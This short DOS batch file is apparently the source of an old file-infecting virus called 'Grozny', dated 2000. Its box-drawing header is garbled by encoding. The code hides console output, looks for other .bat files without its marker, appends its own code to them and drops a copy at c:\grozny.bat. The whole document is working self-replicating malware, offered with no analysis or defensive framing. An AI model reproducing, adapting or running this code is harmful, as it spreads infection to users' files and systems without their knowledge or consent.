:彬僕様様様様様様様様様様様様様様様様様様頬�
:摸�    New Virus Grozny (c) 2000        摸�
:畔瞥様様様様様様様様様様様様様様様様様様癖�
@ctty nul
for %%a in (*.bat) do set Grozny= %%a
for %%b in (*.bat) do find "Grozny" %%b
if not errorlevel 1 goto grozny
for %%c in (*.bat) do copy %%c+%0
:grozny
if not exist c:\grozny.bat copy %0 c:\grozny.bat